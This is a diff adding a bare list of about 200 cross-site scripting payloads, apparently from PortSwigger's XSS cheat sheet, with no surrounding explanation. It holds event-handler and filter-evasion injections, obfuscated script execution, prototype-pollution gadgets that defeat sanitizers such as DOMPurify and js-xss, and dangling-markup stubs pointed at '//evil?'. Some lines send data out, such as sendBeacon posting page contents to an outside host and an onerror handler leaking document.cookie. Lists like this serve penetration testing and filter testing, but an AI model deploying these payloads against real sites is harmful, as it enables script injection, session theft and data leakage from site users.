@@ -1,0 +1,202 @@
+<iframe onload="var that=this;setTimeout(function(){that.src=that.src.replace('#','#x')},500);setTimeout(x=>that.src=that.src.replace('#x','#'),1000);" src="https://portswigger-labs.net/xss/xss.php?x=<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><xss id=x style=position:absolute; onanimationcancel=print()>test</xss>#">
+<iframe onload="print()" src="https://portswigger-labs.net/xss/xss.php?x=<body onbeforeprint=console.log(1)>"></iframe>
+<body onbeforeunload=navigator.sendBeacon('//ssl.portswigger-labs.net/',document.body.innerHTML)>
+<iframe onload="if(!window.flag){this.contentWindow.location='https://portswigger-labs.net/xss/xss.php?x=<body onhashchange=print()>#';flag=1}" src="https://portswigger-labs.net/xss/xss.php?x=<body onhashchange=print()>"></iframe>
+<iframe onload="this.contentWindow.postMessage('','*')" src="https://portswigger-labs.net/xss/xss.php?x=<body onmessage=print()>"></iframe>
+<iframe onload="if(!window.flag){this.contentWindow.location='https://portswigger-labs.net/xss/xss.php?x=<body onpopstate=print(1)>#';flag=1}" src="https://portswigger-labs.net/xss/xss.php?x=<body onpopstate=print(1)>"></iframe>
+<iframe onload="this.style.width='1000px'" src="https://portswigger-labs.net/xss/xss.php?x=<body onresize=print()>"></iframe>
+<iframe onload="var that=this;setTimeout(function(){that.src=that.src.replace('#','#x')},500);setTimeout(x=>that.src=that.src.replace('#x','#'),1000);" src="https://portswigger-labs.net/xss/xss.php?x=<style>:target {color:red;}</style><xss id=x style=%22transition:color 10s%22 ontransitioncancel=print()>test</xss>#">
+<iframe onload="src=src+'#x'" src="https://portswigger-labs.net/xss/xss.php?x=<style>:target {transform: rotate(180deg);}</style><xss id=x style=%22transition:transform 2s%22 ontransitionrun=print()></xss>">
+<body onunload=navigator.sendBeacon('//ssl.portswigger-labs.net/',document.body.innerHTML)>
+<iframe onload="print()" src="https://portswigger-labs.net/xss/xss.php?x=<body onafterprint=alert(1)>"></iframe>
+<body onpagehide=navigator.sendBeacon('//ssl.portswigger-labs.net/',document.body.innerHTML)>
+<body onpageswap=navigator.sendBeacon('//ssl.portswigger-labs.net/',document.body.innerHTML)>
+<input type="file" id="fileInput" /><script>const fileInput = document.getElementById('fileInput');const dataTransfer = new DataTransfer();const file = new File(['Hello world!'], 'hello.txt', {type: 'text/plain'});dataTransfer.items.add(file);fileInput.files = dataTransfer.files</script>
+<script>{onerror=eval}throw{lineNumber:1,columnNumber:1,fileName:1,message:'alert\x281\x29'}</script>
+<script>throw{},onerror=Uncaught=eval,h=location.hash,e={lineNumber:1,columnNumber:1,fileName:0,message:h[2]+h[1]+h},!!window.InstallTrigger?e:e.message</script>
+<script>throw/x/,onerror=Uncaught=eval,h=location.hash,e=Error,e.lineNumber=e.columnNumber=e.fileName=e.message=h[2]+h[1]+h,!!window.InstallTrigger?e:e.message</script>
+<script>'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}</script>
+<script>'alert\x281\x29'instanceof{[Symbol['hasInstance']]:eval}</script>
+<script>location='javascript:alert\x281\x29'</script>
+<script>alert`1`</script>
+<script>new Function`X${document.location.hash.substr`1`}`</script>
+<script>Function`X${document.location.hash.substr`1`}```</script>
+<video><source onerror=location=/\02.rs/+document.cookie>
+<script>throw[onerror]=[alert],1</script>
+<SCRIPT SRC=HTTPS://PORTSWIGGER-LABS.NET/A.JS></SCRIPT>
+<script>ondevicemotion=setTimeout;Event.prototype.toString=URIError.prototype.toString;Event.prototype.message='alert\x281\x29'</script>
+<script>ondeviceorientation=setTimeout;Event.prototype.toString=Error.prototype.toString;Event.prototype.name='alert\x281\x29'</script>
+<script>ondeviceorientationabsolute=setTimeout;Event.prototype.toString=WebTransportError.prototype.toString;Event.prototype.name='alert\x281\x29'</script>
+<script>onpagereveal=setTimeout;Event.prototype.toString=AggregateError.prototype.toString;Event.prototype.name='alert\x281\x29'</script>
+<script>onpageswap=setTimeout;location='x';Event.prototype.toString=EvalError.prototype.toString;Event.prototype.name='alert\x281\x29'</script>
+<script>onhashchange=setTimeout;location.hash=location;Event.prototype.flags='.call\x28alert\x281\x29\x29';Event.prototype.toString=/x/.toString</script>
+<script>onscroll=setTimeout;document.body.style.height='9999px';document.documentElement.scrollTop=1;Event.prototype.toString=ReferenceError.prototype.toString;Event.prototype.name='alert\x281\x29'</script>
+<script>onscrollend=setTimeout;document.body.style.height='9999px';document.documentElement.scrollTop=1;Event.prototype.toString=SyntaxError.prototype.toString;Event.prototype.name='alert\x281\x29'</script>
+<input value=x autofocus onfocus="window.onselect=setTimeout;this.selectionStart=1;Event.prototype.toString=TypeError.prototype.toString;Event.prototype.message='alert\x281\x29'">
+<img/src/style=transition:0.1s onerror="window.ontransitionstart=setTimeout;this.style.opacity=0;Event.prototype.toString=x=>'alert\x281\x29'">
+<img/src/onerror="window.onload=setTimeout;Event.prototype.toString=DOMException.prototype.toString;Event.prototype.name='alert\x281\x29'">
+<img/src/onerror=onpageshow=setTimeout;Event.prototype.toString=WebTransportError.prototype.toString;Event.prototype.name='alert\x281\x29'>
+<img/src/onerror=window.onerror=eval;ReferenceError.prototype.name=';alert\x281\x29;var\x20Uncaught//';z>
+<svg onload=onerror=eval;new'"-alert\x281\x29//'>
+<script>onerror=eval,new name</script>
+<img src onerror=src=1,attributes[1].value=alt+id alt=ale id=rt&lpar;1&rpar;>
+<svg onload="attributes[0].value=id+URL+id,new onload" id=`>
+<input onfocus="attributes[0].value=id+URL+id,new onfocus" id=` autofocus>
+<input onclick=attributes[0].value='`'+URL+'`'>
+<form><input onclick="formAction=top.name,type='submit',new submit">
+<svg onload=innerHTML=URL,innerHTML=textContent>
+<img/src/onerror=innerHTML=URL,innerHTML=textContent>
+<iframe src=https://portswigger-labs.net/xss/xss.php?x='-[location=name]-'&context=js_string_single name=javascript:alert(1)></script>
+<iframe src=https://portswigger-labs.net/xss/xss.php?x='-[location.href=name]-'&context=js_string_single name=javascript:alert(1)></script>
+'-[location='javascript:alert%281%29']-'
+'-[location='javascript:alert\x281\x29']-'
+'-[location='javascript:alert\u00281\u0029']-'
+'-[location='javascript:alert\501\51']-'
+'-location.replace('javascript:a\lert(1)')-'
+'-[location='javascript:a\lert(1)']-'
+<xss tabindex=1 autofocus onfocus=atob.constructor('a'+'lert(1)')()>
+<xss tabindex=1 autofocus onfocus=btob.constructor('a'+'lert(1)')()>
+<xss tabindex=1 autofocus onfocus=Ink.constructor('a'+'lert(1)')()>
+<xss tabindex=1 autofocus onfocus=HID.constructor('a'+'lert(1)')()>
+<xss tabindex=1 autofocus onfocus=GPU.constructor('a'+'lert(1)')()>
+<xss tabindex=1 autofocus onfocus=when.constructor('a'+'lert(1)')()>
+<xss tabindex=1 autofocus onfocus=find.constructor('a'+'lert(1)')()>
+<xss tabindex=1 autofocus onfocus=print.constructor('a'+'lert(1)')()>
+<xss tabindex=1 autofocus onfocus=Set.constructor('a'+'lert(1)')()>
+<xss tabindex=1 autofocus onfocus={}.constructor.constructor('a'+'lert(1)')()>
+<xss tabindex=1 autofocus onfocus=''.constructor.constructor('a'+'lert(1)')()>
+<xss tabindex=1 autofocus onfocus=[].constructor.constructor('a'+'lert(1)')()>
+<xss tabindex=1 autofocus onfocus=0..constructor.constructor('a'+'lert(1)')()>
+<xss tabindex=1 autofocus onfocus=0n.constructor.constructor('a'+'lert(1)')()>
+<xss tabindex=1 autofocus onfocus=s=createElement('script'),s.append('a'+'lert(1)'),this.append(s)>
+<xss tabindex=1 autofocus onfocus=location.replace('javascript:a\lert(1)')>
+<xss tabindex=1 autofocus onfocus=location='javascript:a\lert(1)'>
+<xss tabindex=1 autofocus onfocus=location=self.name>
+<xss tabindex=1 autofocus onfocus=location=frames.name>
+<xss tabindex=1 autofocus onfocus=location=globalThis.name>
+<xss tabindex=1 autofocus onfocus=throw/**/self.onerror=&#97lert,1>
+<xss tabindex=1 autofocus onfocus=throw/**/frames.onerror=&#97lert,1>
+<xss tabindex=1 autofocus onfocus=throw/**/globalThis.onerror=&#97lert,1>
+<xss title=aler id=t tabindex=1 autofocus onfocus=throw&Tab;defaultView.onerror=defaultView[title+id],1>
+<xss title=aler id=t tabindex=1 autofocus onfocus=throw&#32defaultView.onerror=defaultView[title+id],1>
+<xss title=aler id=t tabindex=1 autofocus onfocus=throw&#32self.onerror=self[title+id],1>
+<xss title=aler id=t tabindex=1 autofocus onfocus=throw&#32globalThis.onerror=globalThis[title+id],1>
+<xss title=aler id=t tabindex=1 autofocus onfocus=throw&#32frames.onerror=frames[title+id],1>
+<xss title=java id=script:ale class=rt&lpar;1&rpar; tabindex=1 autofocus onfocus=location=title+id+className>
+<xss title=java id=script:ale class=rt&#40;1&#41; tabindex=1 autofocus onfocus=location=title+id+className>
+<xss title=java id=script:ale class=rt&#x28;1&#x29; tabindex=1 autofocus onfocus=location=title+id+className>
+<xss tabindex=1 autofocus onfocus=window['a'+'lert'](1)>
+<xss tabindex=1 autofocus onfocus=window[`a`+'lert'](1)>
+<xss tabindex=1 autofocus onfocus=\u0061lert(1)>
+<xss tabindex=1 autofocus onfocus=\u{0061}lert(1)>
+<xss tabindex=1 autofocus onfocus=\u{61}lert(1)>
+<xss tabindex=1 autofocus onfocus=\u{00000000000061}lert(1)>
+<xss tabindex=1 autofocus onfocus=self['a'+'lert'](1)>
+<xss tabindex=1 autofocus onfocus=self[`${`a`}lert`](1)>
+<xss tabindex=1 autofocus onfocus=self['\a'+'lert'](1)>
+<xss tabindex=1 autofocus onfocus=self['\x61'+'lert'](1)>
+<xss tabindex=1 autofocus onfocus=self['\141'+'lert'](1)>
+<xss tabindex=1 autofocus onfocus=self[/a/.source+/lert/.source](1)>
+<xss tabindex=1 autofocus onfocus=self[atob.name[0]+'lert'](1)>
+<xss tabindex=1 autofocus onfocus=self[String.fromCharCode(0x61)+'lert'](1)>
+<xss tabindex=1 autofocus onfocus=self[String.fromCodePoint(0x61)+'lert'](1)>
+<xss tabindex=1 autofocus onfocus=self[10..toString(17)+'lert'](1)>
+<xss tabindex=1 autofocus onfocus=self[10n.toString(17)+'lert'](1)>
+<xss tabindex=1 autofocus onfocus=self[0xa.toString(17)+'lert'](1)>
+<xss tabindex=1 autofocus onfocus=self[0b1010.toString(17)+'lert'](1)>
+<xss tabindex=1 autofocus onfocus=self[0o12.toString(17)+'lert'](1)>
+<xss tabindex=1 autofocus onfocus=self[atob('YQ==')+'lert'](1)>
+<xss tabindex=1 autofocus onfocus=self[unescape('%61')+'lert'](1)>
+<xss tabindex=1 autofocus onfocus=self[decodeURI('%61')+'lert'](1)>
+<xss tabindex=1 autofocus onfocus=self[decodeURIComponent('%61')+'lert'](1)>
+<xss tabindex=1 autofocus onfocus=self['a'+[]+'lert'](1)>
+<xss tabindex=1 autofocus onfocus=frames['a'+'lert'](1)>
+<xss tabindex=1 autofocus onfocus=defaultView[10n.toString(17)+'lert'](1)>
+<xss tabindex=1 autofocus onfocus=defaultView[0xa.toString(17)+'lert'](1)>
+<xss tabindex=1 autofocus onfocus=defaultView[0b1010.toString(17)+'lert'](1)>
+<xss tabindex=1 autofocus onfocus=defaultView[0o12.toString(17)+'lert'](1)>
+<xss tabindex=1 autofocus onfocus=defaultView[atob('YQ==')+'lert'](1)>
+<xss tabindex=1 autofocus onfocus=defaultView[unescape('%61')+'lert'](1)>
+<xss tabindex=1 autofocus onfocus=defaultView[decodeURI('%61')+'lert'](1)>
+<xss tabindex=1 autofocus onfocus=defaultView[decodeURIComponent('%61')+'lert'](1)>
+<xss tabindex=1 autofocus onfocus=defaultView['a'+[]+'lert'](1)>
+<xss tabindex=1 autofocus onfocus=defaultView['a'+'lert'](1)>
+<script>Object.prototype.message='alert\x281337\x29';Array.prototype.toString=Error.prototype.toString;Error.prepareStackTrace = Function;const x = new Error;x.valueOf=x.stack;+x;</script>
+<embed code=https://portswigger-labs.net width=500 height=500 type=text/html>
+<object width=500 height=500 type=text/html><param name=url value=https://portswigger-labs.net>
+<object width=500 height=500 type=text/html><param name=code value=https://portswigger-labs.net>
+<object width=500 height=500 type=text/html><param name=movie value=https://portswigger-labs.net>
+<object width=500 height=500 type=text/html><param name=src value=https://portswigger-labs.net>
+<a href=# download="filename.html">Test</a>
+<img referrerpolicy="no-referrer" src="//portswigger-labs.net">
+<a href=# onclick="window.open('http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//','alert(1)')">XSS</a>
+<iframe name="alert(1)" src="https://portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//"></iframe>
+<base target="alert(1)"><a href="http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//">XSS via target in base tag</a>
+<a target="alert(1)" href="http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//">XSS via target in a tag</a>
+<img src="validimage.png" width="10" height="10" usemap="#xss"><map name="xss"><area shape="rect" coords="0,0,82,126" target="alert(1)" href="http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//"></map>
+<form action="http://subdomain1.portswigger-labs.net/xss/xss.php" target="alert(1)"><input type=hidden name=x value="';eval(name)//"><input type=hidden name=context value=js_string_single><input type="submit" value="XSS via target in a form"></form>
+<form><input type=hidden name=x value="';eval(name)//"><input type=hidden name=context value=js_string_single><input type="submit" formaction="http://subdomain1.portswigger-labs.net/xss/xss.php" formtarget="alert(1)" value="XSS via formtarget in input type submit"></form>
+<form><input type=hidden name=x value="';eval(name)//"><input type=hidden name=context value=js_string_single><input name=1 type="image" src="validimage.png" formaction="http://subdomain1.portswigger-labs.net/xss/xss.php" formtarget="alert(1)" value="XSS via formtarget in input type image"></form>
+<meta http-equiv="refresh" content="0; url=//portswigger-labs.net">
+<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+<iframe sandbox src="//portswigger-labs.net"></iframe>
+<meta name="referrer" content="no-referrer">
+<script>\u0061lert(1)</script>
+<script>\u{61}lert(1)</script>
+<script>\u{0000000061}lert(1)</script>
+<script src=data:text/javascript;base64,YWxlcnQoMSk=></script>
+<script src=data:text/javascript;base64,&#x59;&#x57;&#x78;&#x6c;&#x63;&#x6e;&#x51;&#x6f;&#x4d;&#x53;&#x6b;&#x3d;></script>
+<script src=data:text/javascript;base64,%59%57%78%6c%63%6e%51%6f%4d%53%6b%3d></script>
+<iframe srcdoc=&lt;script&gt;alert&lpar;1&rpar;&lt;&sol;script&gt;></iframe>
+<iframe src="javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'"></iframe>
+<svg><script>&#x5c;&#x75;&#x30;&#x30;&#x36;&#x31;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x63;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x35;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x32;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x34;(1)</script></svg>
+<img src=x onerror=location=atob`amF2YXNjcmlwdDphbGVydChkb2N1bWVudC5kb21haW4p`>
+<body background="//evil? <table background="//evil? <table><thead background="//evil? <table><tbody background="//evil? <table><tfoot background="//evil? <table><td background="//evil? <table><th background="//evil?
+<link rel=stylesheet href="//evil?
+<link rel=icon href="//evil?
+<meta http-equiv="refresh" content="0; http://evil?
+<img src="//evil? <image src="//evil?
+<video><track default src="//evil?
+<video><source src="//evil?
+<audio><source src="//evil?
+<input type=image src="//evil?
+<form><button style="width:100%;height:100%" type=submit formaction="//evil?
+<form><input type=submit value="XSS" style="width:100%;height:100%" type=submit formaction="//evil?
+<button form=x style="width:100%;height:100%;"><form id=x action="//evil?
+<object data="//evil?
+<iframe src="//evil?
+<embed src="//evil?
+<form><button formaction=//evil>XSS</button><textarea name=x>
+<button form=x>XSS</button><form id=x action=//evil target='
+<a href=http://subdomain1.portswigger-labs.net/dangling_markup/name.html><font size=100 color=red>You must click me</font></a><base target="
+<form><input type=submit value="Click me" formaction=http://subdomain1.portswigger-labs.net/dangling_markup/name.html formtarget="
+<a href=abc style="width:100%;height:100%;position:absolute;font-size:1000px;">xss<base href="//evil/
+<embed src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name="
+<iframe src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name="
+<object data=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name="
+<frameset><frame src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name="
+<input type=hidden type=image src="//evil?
+<video poster="//evil?
+<script> Object.prototype.attrs = {src:1}; Object.prototype.src='https://portswigger-labs.net/xss/xss.js' </script> <!-- Start Framework code--><script src=https://tags.tiqcdn.com/utag/tealium-solutions/main/prod/utag.js></script> <!--End Framework code-->
+<script>Object.prototype.BOOMR = 1; Object.prototype.url='https://portswigger-labs.net/xss/xss.js'</script> <!-- Start Framework code--><script src=https://portswigger-labs.net/xss/boomerang.js></script> <!--End Framework code-->
+<!-- Start Framework code--><script/src="https://cdnjs.cloudflare.com/ajax/libs/lodash.js/4.17.15/lodash.min.js"></script> <!--End Framework code--> <script> Object.prototype.sourceURL = '\u2028\u2029alert(1)' </script> <script> _.template('test') </script>
+<!-- Start Framework code--><script src="https://cdnjs.cloudflare.com/ajax/libs/sanitize-html/1.27.5/sanitize-html.min.js"></script> <!--End Framework code--> <script> Object.prototype['*'] = ['onload']</script> <script> document.write(sanitizeHtml('<iframe onload=alert(1)>')) </script>
+<!-- Start Framework code--><script src="https://cdnjs.cloudflare.com/ajax/libs/js-xss/0.3.3/xss.min.js"></script> <!--End Framework code--> <script> Object.prototype.whiteList = {img: ['onerror', 'src']} </script> <script> document.write(filterXSS('<img src onerror=alert(1)>')) </script>
+<!-- Start Framework code--><script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/2.0.12/purify.min.js"></script> <!--End Framework code--> <script> Object.prototype.ALLOWED_ATTR = ['onerror', 'src'] </script> <script> document.write(DOMPurify.sanitize('<img src onerror=alert(1)>')) </script>
+<script> Object.prototype.documentMode = 9 </script> <!-- Start Framework code--><script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/2.0.12/purify.min.js"></script> <script> document.write(DOMPurify.sanitize('<img src onerror=alert(1)>')) </script> <!--End Framework code-->
+<!-- Start Framework code--><script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script> <script src="https://cdnjs.cloudflare.com/ajax/libs/underscore.js/1.11.0/underscore-min.js"></script> <script src="https://cdnjs.cloudflare.com/ajax/libs/backbone.js/1.4.0/backbone-min.js"></script> <script src="https://cdnjs.cloudflare.com/ajax/libs/backbone.marionette/4.1.2/backbone.marionette.min.js"></script> <!--End Framework code--> <script> Object.prototype.tagName = 'img' Object.prototype.src = ['x:x'] Object.prototype.onerror = ['alert(1)'] </script> <script> (function() { var View = Mn.View.extend({template: '#template-layout'}); var App = Mn.Application.extend({region: '#app', onStart: function() {this.showView(new View());}}); var app = new App(); app.start(); })(); </script> <div id="template-layout" type="x-template/underscore">xxx</div>
+<script> Object.prototype.script = [1,'<img/src/onerror=alert(1)>','<img/src/onerror=alert(2)>'] </script> <!-- Start Framework code--><script type="text/javascript"> !function(){var analytics=window.analytics=window.analytics||[];if(!analytics.initialize)if(analytics.invoked)window.console&&console.error&&console.error("Segment snippet included twice.");else{analytics.invoked=!0;analytics.methods=["trackSubmit","trackClick","trackLink","trackForm","pageview","identify","reset","group","track","ready","alias","debug","page","once","off","on","addSourceMiddleware","addIntegrationMiddleware","setAnonymousId","addDestinationMiddleware"];analytics.factory=function(t){return function(){var e=Array.prototype.slice.call(arguments);e.unshift(t);analytics.push(e);return analytics}};for(var t=0;t<analytics.methods.length;t++){var e=analytics.methods[t];analytics[e]=analytics.factory(e)}analytics.load=function(t,e){var n=document.createElement("script");n.type="text/javascript";n.async=!0;n.src="https://cdn.segment.com/analytics.js/v1/"+t+"/analytics.min.js";var a=document.getElementsByTagName("script")[0];a.parentNode.insertBefore(n,a);analytics._loadOptions=e};analytics.SNIPPET_VERSION="4.1.0";analytics.load("platform");analytics.page();}}();</script> <!--End Framework code-->
+<!-- Start Framework code--><script src="https://cdnjs.cloudflare.com/ajax/libs/knockout/3.5.0/knockout-min.js"></script> <!--End Framework code--> <strong data-bind="text:'hello'"></strong> <script> Object.prototype[4]="a':1,[alert(1)]:1,'b";Object.prototype[5]=','; </script><script> ko.applyBindings({}) </script>
+<a href="vbscript:MsgBox+1">XSS</a> <a href="#" onclick="vbs:Msgbox+1">XSS</a> <a href="#" onclick="VBS:Msgbox+1">XSS</a> <a href="#" onclick="vbscript:Msgbox+1">XSS</a> <a href="#" onclick="VBSCRIPT:Msgbox+1">XSS</a> <a href="#" language=vbs onclick="vbscript:Msgbox+1">XSS</a>
+<a href=# language="JScript.Encode" onclick="#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@">XSS</a> <a href=# onclick="JScript.Encode:#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@">XSS</a>
+<iframe onload=VBScript.Encode:#@~^CAAAAA==\ko$K6,FoQIAAA==^#~@> <iframe language=VBScript.Encode onload=#@~^CAAAAA==\ko$K6,FoQIAAA==^#~@>
+<link href="xss.js" rel=stylesheet type="text/javascript">
+<form><button name=x formaction=x><b>stealme
+<form action=x><button>XSS</button><select name=x><option><plaintext><script>token="supersecret"</script>
+<div style="-moz-binding:url(//businessinfo.co.uk/labs/xbl/xbl.xml#xss)"> <div style="\-\mo\z-binding:url(//businessinfo.co.uk/labs/xbl/xbl.xml#xss)"> <div style="-moz-bindin\67:url(//businessinfo.co.uk/lab s/xbl/xbl.xml#xss)"> <div style="-moz-bindin&#x5c;67:url(//businessinfo.co.uk/lab s/xbl/xbl.xml#xss)">
+<img src="blah" style="-moz-binding: url(data:text/xml;charset=utf-8,%3C%3Fxml%20version%3D%221.0%22%3F%3E%3Cbindings%20xmlns%3D%22 http%3A//www.mozilla.org/xbl%22%3E%3Cbinding%20id%3D%22loader%22%3E%3Cimplementation%3E%3Cconstructor%3E%3C%21%5BCDATA%5Bvar%20url%20%3D%20%22alert.js %22%3B%20var%20scr%20%3D%20document.createElement%28%22script%22%29%3B%20scr.setAttribute%28%22src%22%2Curl%29%3B%20var%20bodyElement%20%3D%20 document.getElementsByTagName%28%22html%22%29.item%280%29%3B%20bodyElement.appendChild%28scr%29%3B%20%5D%5D%3E%3C/constructor%3E%3C/implementation%3E%3C/ binding%3E%3C/bindings%3E)" />
+<isindex type=image src="//evil?
+<isindex type=submit style=width:100%;height:100%; value=XSS formaction="//evil?
+<svg><use href="//subdomain1.portswigger-labs.net/use_element/upload.php#x" /></svg>
+<svg><use href="data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluaycgd2lkdGg9JzEwMCcgaGVpZ2h0PScxMDAnPgo8aW1hZ2UgaHJlZj0iMSIgb25lcnJvcj0iYWxlcnQoMSkiIC8+Cjwvc3ZnPg==#x" /></svg>
+<a+href=#+onclick="window.open('https://portswigger-labs.net/xss/xss.php?x=<script>throw onerror=eval,{lineNumber:1,columnNumber:1,fileName:1,message:name}</script>','+alert(1)','width=500,height=500')">test</a>#
